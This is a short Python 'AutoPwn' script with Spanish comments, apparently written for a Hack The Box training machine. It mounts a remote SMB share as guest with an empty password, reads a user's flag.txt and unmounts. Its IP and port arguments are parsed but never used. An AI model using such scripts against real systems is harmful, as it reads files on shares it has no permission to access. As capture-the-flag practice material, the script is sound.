#!/usr/bin/python3

import os
import subprocess
import argparse

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address
        self.lport = lport

    def run(self):
        mount_path = '/home/axel/HTB/dancing/content/mnt'
        share_path = '//10.129.131.234/WorkShares'
        username = "guest"  # Define el nombre de usuario aquí
        password = ""
        filename = "flag.txt"

        mount_command = f'mount -t cifs {share_path} {mount_path} -o username={username},password='
        # Comando para montar el recurso compartido utilizando CIFS
        subprocess.run(mount_command, shell=True, input=b'\n', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        file_path = os.path.join(mount_path, 'James.P', filename)
        # Ruta completa al archivo dentro del recurso compartido montado

        try:
            with open(file_path, 'r') as file:
                content = file.read()
                print(f"El contenido de 'flag.txt': {content}")
        except FileNotFoundError:
            print(f'El archivo {file_path} no existe.')
        except PermissionError:
            print(f'No tienes permisos para leer el archivo {file_path}.')

        umount_command = f'umount {mount_path}'
        # Comando para desmontar el recurso compartido
        subprocess.run(umount_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def get_arguments():
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    parser.add_argument('-p', '--port', dest='lport', required=True, help='Proporcionar puerto.')
    return parser.parse_args()

def main():
    args = get_arguments()

    exploit = Exploit(args.ip_address, args.lport)
    exploit.run()

if __name__ == '__main__':
    main()
